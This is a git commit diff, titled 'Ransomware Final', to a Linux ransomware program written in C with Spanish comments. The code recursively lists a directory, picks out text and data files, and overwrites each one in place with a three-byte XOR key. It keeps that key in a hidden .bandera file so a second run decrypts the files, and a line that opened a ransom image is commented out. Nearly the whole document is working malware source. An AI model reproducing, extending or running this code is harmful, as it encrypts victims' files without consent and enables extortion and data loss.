9457ed9c219767d802b7e0b012ce12117b4d1c77
Heslak <ser_acosta_95@hotmail.com>
2017-11-24 01:32:02 -0600

    Ransomware Final

--- Linux/Ransomware/Ransomware.c
+++ Linux/Ransomware/Ransomware.c
@@ -2,7 +2,6 @@
 #include<stdlib.h>
 #include<string.h>
 #include<time.h>
-
 //Prototipos de funciones
 void nombre_direccion(char *linea_direccion, char **direccion_carpeta, char *direccion_archivo, char *nombre_archivo, ssize_t tamanio, int *dos_despues, int a,int b,int c, char *nombre_ransomware);
 
@@ -18,7 +17,7 @@ void cifrar(char *direccion_archivo, int a, int b, int c);
 int main(int argc, char *argv[]){
 
 	//Variables para leer salida de comandos y archivos
-	char *linea_direccion=NULL, **direccion_carpeta=NULL, *direccion_archivo=NULL, *nombre_archivo=NULL, *ls=NULL, *ls_awk=NULL, boleano[3],*nombre_ransomware=argv[0],*carpeta=NULL,*tmp=NULL;
+	char *linea_direccion=NULL, **direccion_carpeta=NULL, *direccion_archivo=NULL, *nombre_archivo=NULL, *ls=NULL, *ls_awk=NULL, boleano[3],*nombre_ransomware=argv[0],*carpeta="./",*tmp=NULL;
 
 	//Comando para obtener directorios
 	char comando1[]="ls -lRa 2>/dev/null ";
@@ -27,65 +26,87 @@ int main(int argc, char *argv[]){
 	char awk[]=" | awk '{if (NF>9) {{for(i=9; i<NF; i++) printf $i\" \"} print $i} else  print $NF}'";
 	size_t longitud=0,longitud2=0,longitud3=0;														
 	ssize_t tamanio;
-	int i=0, *dos_despues, a, b, c, arg1=0, arg2=0, arg3=0;
+	int i=0, *dos_despues, a, b, c, arg1=0, arg2=0, arg3=0,cat=0;
 	
 	FILE *direccion_abs=popen("echo $PWD/","r");
 	getline(&tmp,&longitud3,direccion_abs);
-	carpeta=(char *)calloc(strlen(tmp)+strlen(argv[1]),sizeof(char));
-	strncpy (carpeta,tmp, strlen(tmp));
-	carpeta[strlen(tmp)-1]='\0';
-	switch(argc){
-		case 1:
-			break;
-		case 2:
-			if(!strstr(argv[1],"./")){
-				strcat(carpeta,argv[1]);
-			}
-			break;
-		case 5:
-		        arg1=atoi(argv[2]);
-        	        arg2=atoi(argv[3]);
-	                arg3=atoi(argv[4]);
-			break;
-	}
-
-	//Reserva de memoria
-	dos_despues=(int *)calloc(1,sizeof(int));
-	direccion_carpeta=(char**)calloc(1,sizeof(char*));
 	
-	//Reservamos espacio y creamos el comando conforme al argumento que se de (Carpeta a cifrar)
-	ls=(char *)calloc(strlen(comando1)+strlen(carpeta),sizeof(char));								
-	strncpy (ls,comando1,strlen(comando1));
-	ls[strlen(comando1)]='\0';
-	strcat(ls,carpeta);
-
-	ls_awk=(char *)calloc(strlen(ls)+strlen(awk),sizeof(char));
-	strncpy(ls_awk,ls,strlen(ls));
-	ls_awk[strlen(ls)]='\0';
-	strcat(ls_awk,awk);
-	
-	//Ejecutamos los comandos	
-	FILE *directorios=popen(ls,"r"), *directorios2=popen(ls_awk,"r");
-	//Liberamos el espacio de los comandos creados	
-	free(ls);
-	free(ls_awk);
 	FILE *bandera;
 
-	//En caso de que no exista .bandera se crea el archivo y además se procede a cifrar los archivos
-	if((bandera=fopen(".bandera","r"))){
-        	fread(boleano,1,2,bandera);
+        //En caso de que no exista .bandera se crea el archivo y además se procede a cifrar los archivos
+        if((bandera=fopen(".bandera","r"))){
+                fread(boleano,1,2,bandera);
                 fclose(bandera);
         }else{
                 if((bandera=fopen(".bandera","w"))){
-                	fprintf(bandera,"%s","no");
-			strncpy(boleano,"no",strlen("no"));
-			boleano[strlen("no")]='\0';
-                	fclose(bandera);
-		}else{
-			printf("Fallo en ejecución 1");
-			exit(1);
-		}
+                        fprintf(bandera,"%s","no");
+                        snprintf(boleano,strlen("no")+1,"%s","no");
+                        fclose(bandera);
+                }else{
+                        printf("Fallo en ejecución 1");
+                        exit(1);
+                }
         }
+
+	if(strcmp("si",boleano)){	
+		switch(argc){
+			case 1:
+				carpeta=(char *)calloc(strlen(tmp),sizeof(char));
+	                        snprintf(carpeta,strlen(tmp), "%s", tmp);
+				break;
+			case 2:
+				carpeta=(char *)calloc(strlen(tmp)+strlen(argv[1]),sizeof(char));
+			        cat=snprintf(carpeta,strlen(tmp), "%s", tmp);
+				if(!strstr(argv[1],"./")){
+					snprintf(carpeta+cat-1,strlen(argv[1])+1, "%s",argv[1]);			
+				}
+				break;
+			case 3:
+	                        carpeta=(char *)calloc(strlen(tmp)+strlen(argv[1]),sizeof(char));
+	                        cat=snprintf(carpeta,strlen(tmp), "%s", tmp);
+	                        if(!strstr(argv[1],"./")){
+	                                snprintf(carpeta+cat-1,strlen(argv[1])+1, "%s",argv[1]);
+	                        }
+	                        break;
+			case 4:
+	                        carpeta=(char *)calloc(strlen(tmp)+strlen(argv[1]),sizeof(char));
+	                        cat=snprintf(carpeta,strlen(tmp), "%s", tmp);
+	                        if(!strstr(argv[1],"./")){
+	                                snprintf(carpeta+cat-1,strlen(argv[1])+1, "%s",argv[1]);
+	                        }
+	                        break;
+			default:
+				carpeta=(char *)calloc(strlen(tmp)+strlen(argv[1]),sizeof(char));
+	                        cat=snprintf(carpeta,strlen(tmp), "%s", tmp);
+				if(!strstr(argv[1],"./")){
+	                                snprintf(carpeta+cat-1,strlen(argv[1])+1,"%s",argv[1]);
+	                        }
+			        arg1=atoi(argv[2])%256;
+	        	        arg2=atoi(argv[3])%256;
+		                arg3=atoi(argv[4])%256;
+	
+				if((atoi(argv[2])==0 && !strstr(argv[2],"0")) || (atoi(argv[3])==0 && !strstr(argv[3],"0")) || (atoi(argv[4])==0 && !strstr(argv[4],"0")) ){
+			                printf("La contraseña dada no es válida\n");
+		                        srand(time(NULL));
+					if( atoi(argv[2])==0 && !strstr(argv[2],"0")){
+						arg1=rand()%256;
+			                	printf("\tSe cambió %s por %i\n",argv[2],arg1);
+					}
+					if(atoi(argv[3])==0 && !strstr(argv[3],"0")){
+	                                        arg2=rand()%256;
+	                                        printf("\tSe cambió %s por %i\n",argv[3],arg2);
+	                                }
+	                                if(atoi(argv[4])==0 && !strstr(argv[4],"0")){
+	                                        arg3=rand()%256;
+	                                        printf("\tSe cambió %s por %i\n",argv[4],arg3);
+		                	}
+				}
+				break;
+		}
+	}else{
+		carpeta=(char *)calloc(strlen(tmp),sizeof(char));
+	        snprintf(carpeta,strlen(tmp), "%s", tmp);
+	}
 
 	//El archivo .bandera contiene la contraseña para decifrar y además actua como bandera para saber si se va a cifrar o descifrar
 	if(!strcmp("si",boleano)){	
@@ -95,6 +116,7 @@ int main(int argc, char *argv[]){
 			//Obetenemos la contraseña para decifrar
 			fscanf(bandera,"%i %i %i\n",&a,&b,&c);
 			getline(&carpeta,&longitud3,bandera);
+			//printf("%s",carpeta);
 			do{
 				if(i==0){	
 					i++;
@@ -121,11 +143,12 @@ int main(int argc, char *argv[]){
 	}else{
 		//En caso de que se vaya a cifrar se guarda la contraseña en el archivo .bandera
 		if(argc<5){
-			printf("Se ha creado una contraseña al azar.\n");
+			printf("Se ha creado una contraseña al azar:\n");
                         srand(time(NULL));
                         arg1=rand()%256;
                         arg2=rand()%256;
                         arg3=rand()%256;
+			printf("\t%i %i %i\n",arg1,arg2,arg3);
 		}	
 		if((bandera=fopen(".bandera","w"))){	
 
@@ -137,7 +160,21 @@ int main(int argc, char *argv[]){
 			printf("Fallo en ejecución 4");
 		}
 	}
+	
+	dos_despues=(int *)calloc(1,sizeof(int));
+        direccion_carpeta=(char**)calloc(1,sizeof(char*));
 
+	ls=(char *)calloc(strlen(comando1)+strlen(carpeta),sizeof(char));
+        cat=snprintf(ls,strlen(comando1)+1, "%s", comando1);
+        snprintf(ls+cat,strlen(carpeta)+1, "%s", carpeta);
+        
+	ls_awk=(char *)calloc(strlen(ls)+strlen(awk),sizeof(char));
+        cat=snprintf(ls_awk,strlen(ls)+1, "%s", ls);
+        snprintf(ls_awk+cat,strlen(awk)+1, "%s", awk);	
+	FILE *directorios=popen(ls,"r"), *directorios2=popen(ls_awk,"r");
+
+	free(ls);
+	free(ls_awk);
 	//Leemos línea por linea de ambos comandos al mismo tiempo
 	while((tamanio=getline(&linea_direccion, &longitud, directorios)) != -1 ){		
 		getline(&nombre_archivo, &longitud2, directorios2);
@@ -147,7 +184,7 @@ int main(int argc, char *argv[]){
 	//Abrimos imagen cuando se haya cifrado
 	if(!strcmp("no",boleano)){
 		//En caso de que no se pueda abrir mandamos error a null 
-		system("xdg-open ./.img2 2>/dev/null");
+		//system("xdg-open ./.img2 2>/dev/null");
 	}
 	pclose(directorios);
 	pclose(directorios2);
@@ -155,14 +192,14 @@ int main(int argc, char *argv[]){
 }
 
 void nombre_direccion(char *linea_direccion, char **direccion_carpeta, char *direccion_archivo, char *nombre_archivo, ssize_t tamanio, int *dos_despues, int a, int b, int c,char *nombre_ransomware){
-
+	int cat=0;
 	//Obtenemos los direcctorios
 	if(linea_direccion[tamanio-2]==':'){
         	*dos_despues=0;
                	*direccion_carpeta=(char *)calloc(tamanio+1,sizeof(char));
-                strncpy(*direccion_carpeta,linea_direccion,tamanio-2);		
+		cat=snprintf(*direccion_carpeta,tamanio-1,"%s",linea_direccion);
                 if(direccion_carpeta[0][tamanio-3]!='/'){
-			strcat(*direccion_carpeta,"/");
+			snprintf(*direccion_carpeta+cat,strlen("/")+1,"%s","/");
                 }	
 	}
 	
@@ -188,10 +225,10 @@ int creacion_de_archivos(char *direccion_archivo, char *direccion_carpeta, char 
 	char *file=NULL, *direccion_con_barra=NULL, *tipo=NULL;
 	size_t tamanio_file=0;
 	FILE *tipo_archivo;
+	int cat=0;
 	direccion_archivo=(char *)calloc(strlen(direccion_carpeta)+strlen(nombre_archivo),sizeof(char));
-        strncpy(direccion_archivo,direccion_carpeta,strlen(direccion_carpeta));
-	direccion_archivo[strlen(direccion_carpeta)]='\0';
-        strncat(direccion_archivo,nombre_archivo,strlen(nombre_archivo)-1);
+	cat=snprintf(direccion_archivo,strlen(direccion_carpeta)+1,"%s",direccion_carpeta);
+	snprintf(direccion_archivo+cat,strlen(nombre_archivo), "%s",nombre_archivo);
         if(strstr(nombre_archivo,nombre_ransomware) || strstr(nombre_archivo,".bandera") || strstr(nombre_archivo,".img2")){
 		return 0;
         }
@@ -200,15 +237,13 @@ int creacion_de_archivos(char *direccion_archivo, char *direccion_carpeta, char 
 		cifrar(direccion_archivo,a,b,c);
 	}else{
 		direccion_con_barra=agregar_barra(direccion_archivo);
-		printf("%s\n",direccion_con_barra);
 		file=(char *)calloc(strlen(direccion_con_barra)+6,sizeof(char));
-		strncpy(file,"file ",strlen("file "));
-		file[strlen("file ")]='\0';
-		strcat(file,direccion_con_barra);
+		cat=snprintf(file,strlen("file ")+1,"%s","file ");
+		snprintf(file+cat,strlen(direccion_con_barra)+1, "%s",direccion_con_barra);
 		tipo_archivo=popen(file,"r");
 		getline(&tipo,&tamanio_file,tipo_archivo);
 		if(strstr(tipo,"ASCII") || strstr(tipo, "data") || strstr(tipo,"UTF-8")){
-			cifrar(direccion_archivo,a,b,c);		
+			cifrar(direccion_archivo,a,b,c);
 		}	
 		free(tipo);
 		fclose(tipo_archivo);	
@@ -248,10 +283,11 @@ char * agregar_barra(char *sin_barra){
 //Ciframos archivo por archivo, con los argumentos dados y haciendo un xor para cada byte
 
 void cifrar(char *direccion_archivo, int a, int b, int c){
-	FILE *archivo;
+	FILE *archivo=NULL;
 	char *auxiliar=NULL;
 	int tamanio_archivo=0,i=0;
-	if((archivo=fopen(direccion_archivo,"rb"))){  
+
+	if((archivo=fopen(direccion_archivo,"r"))){
         	fseek(archivo,0,SEEK_END);
         	tamanio_archivo=ftell(archivo);
         	auxiliar=(char *)calloc(tamanio_archivo,1);
@@ -260,12 +296,13 @@ void cifrar(char *direccion_archivo, int a, int b, int c){
         	fflush(archivo);
         	fclose(archivo);
         	if((archivo=fopen(direccion_archivo,"wb"))){
-
         		for(i=0;i<tamanio_archivo;i++){
         		        fprintf(archivo,"%c",auxiliar[i]^a^b^c);
         		}
         		free(auxiliar);     
         		fclose(archivo);
 		}
-	}	
+	}else{
+		printf("Fallo en ejecución");
+	}
 }
